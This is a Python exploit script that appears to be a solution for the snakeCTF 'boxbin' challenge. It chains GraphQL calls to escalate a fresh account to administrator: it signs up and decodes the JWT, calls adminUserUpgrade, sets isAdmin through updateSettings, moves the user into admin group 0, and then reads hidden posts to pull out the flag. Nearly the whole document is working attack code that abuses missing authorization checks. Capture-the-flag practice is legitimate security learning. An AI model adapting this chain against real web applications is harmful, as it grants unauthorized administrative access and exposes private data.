"""
  1) signup -> get JWT
  2) adminUserUpgrade(upgradeId=7)
  3) updateSettings('{"isAdmin": true}')
  4) updateUserGroup(userId=<me>, groupId=0)
  5) hiddenPosts { content } -> extract snakeCTF{...}
"""

import base64
import json
import re
import secrets
import string
import sys
from typing import Optional, Dict, Any
import requests

# ---------- Config ----------
BASE_URL = "https://7c77ce6f16128709d469e4e1b7869302.boxbin.challs.snakectf.org/"

GQL_ENDPOINT = BASE_URL.rstrip("/") + "/api/graphql"

USERNAME_PREFIX = "hitcat"
PASSWORD = "Secret123!"
UPGRADE_ID = 7
ADMIN_GROUP_ID = 0
HTTP_TIMEOUT = 20

session = requests.Session()
session.headers.update({"Content-Type": "application/json"})

# ---------- Helpers ----------

def b64url_decode(s: str) -> bytes:
    """Base64URL decode with automatic padding."""
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_get_user_id(token: str) -> int:
    """Extract userId from unsigned JWT (no secret needed)."""
    try:
        _, payload_b64, _ = token.split(".")
        payload = json.loads(b64url_decode(payload_b64).decode("utf-8"))
        return int(payload["userId"])
    except Exception as exc:
        print(f"[!] Failed to decode JWT userId: {exc}")
        sys.exit(1)


def gql(query: str, variables: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Send a GraphQL request and return the 'data' dict or exit on error."""
    payload = {"query": query, "variables": variables or {}}
    resp = session.post(GQL_ENDPOINT, json=payload, timeout=HTTP_TIMEOUT)

    # Ensure JSON response
    try:
        data = resp.json()
    except Exception:
        print(f"[!] Non-JSON response ({resp.status_code}): {resp.text[:400]}")
        sys.exit(1)

    # Handle GraphQL errors
    if "errors" in data:
        print("[!] GraphQL errors:")
        print(json.dumps(data["errors"], indent=2))
        sys.exit(1)

    return data["data"]


def rand_suffix(n: int = 5) -> str:
    """Random lowercase/digit suffix to avoid username collisions."""
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(n))


# ---------- Main chain ----------

def main() -> None:
    # 1) SignUp -> JWT in data.signup
    username = f"{USERNAME_PREFIX}{rand_suffix()}"
    print(f"[*] Signing up as: {username}")

    q_signup = """
    mutation Signup($username: String!, $password: String!) {
      signup(username: $username, password: $password)
    }"""
    d = gql(q_signup, {"username": username, "password": PASSWORD})
    token = d["signup"]
    print(f"[+] JWT obtained: {token}")

    #Update session auth header
    session.headers.update({"Authorization": token})
    
    # Decode userId from JWT
    user_id = jwt_get_user_id(token)
    print(f"[+] Decoded userId from JWT: {user_id}")

    # 2) adminUserUpgrade(upgradeId: 7)
    print("[*] Upgrading user via adminUserUpgrade…")
    q_upgrade = """
    mutation AdminUserUpgrade($upgradeId: ID!) {
      adminUserUpgrade(upgradeId: $upgradeId) { username }
    }"""
    d = gql(q_upgrade, {"upgradeId": UPGRADE_ID})
    print(f"[+] adminUserUpgrade OK for user: {d['adminUserUpgrade']['username']}")

    # 3) updateSettings(settings: "{\"isAdmin\":true}") – string parsed as JSON server-side
    print("[*] Enabling admin via updateSettings…")
    q_settings = """
    mutation UpdateSettings($settings: String!) {
      updateSettings(settings: $settings)
    }"""
    settings_str = json.dumps({"isAdmin": True})  # -> '{"isAdmin": true}'
    d = gql(q_settings, {"settings": settings_str})
    print(f"[+] updateSettings returned: {d['updateSettings']}")

    # 4) updateUserGroup(userId: <me>, groupId: 0)
    print("[*] Switching current user to admin group…")
    q_group = """
    mutation UpdateUserGroup($userId: ID!, $groupId: Int!) {
      updateUserGroup(userId: $userId, groupId: $groupId) {
        id
        groupId
        __typename
      }
    }"""
    d = gql(q_group, {"userId": str(user_id), "groupId": ADMIN_GROUP_ID})
    print(f"[+] updateUserGroup OK -> id={d['updateUserGroup']['id']} groupId={d['updateUserGroup']['groupId']}")

    # 5) hiddenPosts { content } -> extract snakeCTF{...}
    print("[*] Fetching hiddenPosts…")
    q_hidden = """
    query HiddenPosts {
      hiddenPosts {
        content
      }
    }"""
    d = gql(q_hidden)
    posts = d.get("hiddenPosts", [])
    contents = "\n".join(p.get("content", "") for p in posts)
    print(f"[+] Retrieved {len(posts)} hidden posts")

    # Extract the flag
    print("[*] Extracting flag with regex…")
    # try escaped then unescaped variants
    matches = re.findall(r"snakeCTF\\{[^}]+\\}", contents)
    if not matches:
        matches = re.findall(r"snakeCTF\{[^}]+\}", contents)

    if matches:
        print(f"[!] FLAG: {matches[0]}")
    else:
        print("[!] Flag not found in hiddenPosts content.")
        print("--- hiddenPosts preview (first 500 chars) ---")
        print(contents[:500])


if __name__ == "__main__":
    main()
